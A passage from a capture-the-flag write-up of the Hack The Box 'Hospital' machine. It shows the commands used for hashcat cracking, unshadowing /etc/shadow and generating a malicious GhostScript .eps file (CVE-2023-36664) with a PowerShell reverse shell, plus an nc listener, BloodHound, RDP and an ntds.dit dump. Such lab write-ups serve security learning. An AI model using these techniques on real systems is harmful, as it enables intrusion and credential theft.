### Cracking the hashes admin hash: {#cracking-the-hashes-admin-hash}

-   **I check the hash type by using**: <https://hashes.com>
    -   {{< figure src="/ox-hugo/2024-10-02-095337_.png" >}}
        -   It says they are bcrypt `$2*$, Blowfish (Unix)`

-   **Checking hashcats website we can see these hashes use mode** `3200`
    -   {{< figure src="/ox-hugo/2024-10-02-095455_.png" >}}

-   **I start** `hashcat` **&amp; crack the** `admin` **hash almost immediately**:

    -   `hashcat -m 3200 Mysql-Hashes.txt ~/Wordlists/rockyou.txt`
        -   {{< figure src="/ox-hugo/2024-10-02-095717_.png" >}}
        -   I also get the patient hash.

    <!--listend-->

    -   I try cred stuffing with these and accessing the webmail but no access. Onto the next thing&#x2026;..


### Dumping Shadow Hashes: {#dumping-shadow-hashes}

-   **As I am root I can dump the** `/etc/shadow`:
    -   I copy the `/etc/passwd` &amp; `/etc/shadow` locally.
    -   I use [unshadow](https://www.kali.org/tools/john/#unshadow) to extract the hashes:
        -   `unshadow passwd shadow > unshadowed.hashes`
            -   {{< figure src="/ox-hugo/2024-10-02-143126_.png" >}}

-   I am going to focus on cracking the `drs` hash as I already have access to the root account &amp; this is a VM so unless I can perform a VM escape a lateral move seems like the logical approach.
    -   VM escapes are possible but as far as I am aware, more advanced than this box is labelled.


### Cracking Dr Williams Hashed Password: {#cracking-dr-williams-hashed-password}

-   **I find out the format of the hash on hashes.com**
    -   {{< figure src="/ox-hugo/2024-10-02-143151_.png" >}}
        -   It's sha512crypt:
-   **Checking hashcat's website I can see that it's mode** `1800`:
    -   {{< figure src="/ox-hugo/2024-10-02-143402_.png" >}}

-   **I copy the hash to a seperate file &amp; start cracking with hashcat**:
    -   `hashcat -m 1800 drhash ~/Wordlists/rockyou.txt`
        -   {{< figure src="/ox-hugo/2024-10-02-144654_.png" >}}
            -   It cracks!!
            -   I try the creds on SMB but no use again.


### Accessing Dr Williams Email: {#accessing-dr-williams-email}

-   **I try all the creds in the webmail portal &amp; get in** Dr Williams **creds**.
    -   Password re-use, naughty, naughty Dr Williams.

-   I find that the RoundCube version running is `1.6.4`
    -   {{< figure src="/ox-hugo/2024-10-02-145126_.png" >}}

-   I can see that the one email in the inbox is from `drbrown`, I add their name to my found usernames list.

-   **GhostScript file request**:
    -   In the email the Dr Brown is requesting a file in the `.eps` format for [GhostScript](https://www.ghostscript.com/) from Dr Williams.
        -   Looking into GhostScript I can see it's an interpreter for PostScript (PS) and Portable Document Format (PDF) files, enabling viewing, printing, and converting them.
-   **Finding a GhostScript EPS CVE**:
    -   Looking online it is possible to trigger a reverse shell via a malicious `.eps` file with `GhostScript`.
        -   This would mean if we can get Dr Brown to open it we can get a reverse shell.
        -   <https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?tab=readme-ov-file>


## 4. Host Foothold: {#4-dot-host-foothold}


### Gaining Access to the host via Malicious `.eps` GhostScript Exploit: {#gaining-access-to-the-host-via-malicious-dot-eps-ghostscript-exploit}

Looking at the readme for the GhostScript public exploit CVE_2023_36664, we have alot of options. We cannot use the standard `--revshell` command as that is for when executed on a unix host only. However we can generate our own payload and have this placed in an `eps` file.

1.  **I use** <https://revhells.com> **to generate a** `powershell` **reverse shell and base64 encode it**:
    -   {{< figure src="/ox-hugo/2024-10-03-195708_.png" >}}

2.  **I use the exploit to generate the malicious** `.eps` **file**:
    -   `python3 CVE_2023_36664_exploit.py -g -p "<payload>" -x eps`
    -   {{< figure src="/ox-hugo/2024-10-02-162259_.png" >}}

3.  **I start my nc listener**:
    -   `nc -nvlp 53`

4.  **Respond in the email client &amp; attach the** `malicious.eps` **file**:
    -   {{< figure src="/ox-hugo/2024-10-02-162827_.png" >}}

5.  **Within seconds I have a reverse shell**:
    -   {{< figure src="/ox-hugo/2024-10-02-162901_.png" >}}

+Note+: This is one of the coolest boxes I have done. The creativity is amazing.


### Finding Hard-Coded Creds In `ghostscript.bat` file: {#finding-hard-coded-creds-in-ghostscript-dot-bat-file}

-   As soon as I connect I see there is a file called `ghostscript.bat` in the Documents folder of drbrown.
-   Looking at the contents I can see that it has hard-coded credentials:
    -   {{< figure src="/ox-hugo/2024-10-02-163529_.png" >}}

-   **I verify these are valid with netexec &amp; evil-winrm**:
    -   {{< figure src="/ox-hugo/2024-10-02-163604_.png" >}}
    -   As they are valid with `evil-winrm` this gives us an easy way for re-entry onto the host.

-   **I check my privs**:
    -   I see I have the ability add workstations to the domain. If I have delegation rights this could be a valid attack path. Lets run bloodhound to find out.
    -   {{< figure src="/ox-hugo/2024-10-02-170254_.png" >}}

-   **Running Bloodhound**:
    -   `python3 bloodhound.py -dc dc.hospital.htb -c All -u $user -p $pass -d hospital.htb -ns $box`
        -   {{< figure src="/ox-hugo/2024-10-02-172949_.png" >}}

        -   **I find that our user is part of the Remote Desktop users group**:
            -   {{< figure src="/ox-hugo/2024-10-02-172853_.png" >}}
                -   However I do not have delegation privs. Let's connect to the host and see if we can find anything there.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Connecting Via RDP to the target: {#connecting-via-rdp-to-the-target}

-   **As we are part of the Remote Desktop Users Group, I connect to the host**:
    -   `xfreerdp /v:$box /u:$user /p:$pass`


### Capturing Credentials from the Selenium WebDriver: {#capturing-credentials-from-the-selenium-webdriver}

-   **Hard Coded Creds In Internet Explorer**:
    -   As soon as I login, an internet explorer window opens and it looks like the credentials are being entered in by a script, manually typing each character in.
        -   {{< figure src="/ox-hugo/2024-10-02-171832_.png" >}}
        -   I wait a minute and process begins again, which means it's looping.

-   **Discovering Selenium is being used on the host for automating credential entry**:
    -   Investigating further when the loop starts again a powershell window opens and displays the below. The script is using "selenium" which is a framework used for automating web browsers.
        -   {{< figure src="/ox-hugo/2024-10-02-172135_.png" >}}

-   **Redirecting the Selenium output to capture the Adminsitrator Username &amp; Password**:
    -   As the creds are being manually typed, all we have to do is have the text redirect to us to something we control to capture the credentials.
    -   On the next loop I open notepad and when it starts entering the creds in internet explorer I select Notepad &amp; it starts typing the creds there
        -   {{< figure src="/ox-hugo/2024-10-02-172621_.png" >}}


## 4. Ownership: {#4-dot-ownership}

-   **I check the Administrator creds to see if they have been re-used**:
    -   Boom, we have ownership
        -   {{< figure src="/ox-hugo/2024-10-02-172730_.png" >}}

-   **I connect via evil-winrm &amp; I get the root flag**:
    -   {{< figure src="/ox-hugo/2024-10-02-173415_.png" >}}

-   **It wouldn't be full ownership unless I dump the** `ntds.dit` **file to get all the hashes now would it?**
    -   {{< figure src="/ox-hugo/2024-10-02-173157_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned about using the GhostScript eps exploit, I was not even aware that existed so that was cool.
2.  I learned that you can re-direct selenium output (this is important as I have used selenium in previous projects, never to enter anything sensitive but this interesting none-the less)
3.  I learned not to do boxes when I get sleepy. I got caught for a long time looking for the correct foothold.
4.  I also learned that you can be really creative when making these boxes, this one was honestly amazing.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  I was sleepy when I started so overlooked a pretty obvious foothold/entrypoint even though it was staring me in the face.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


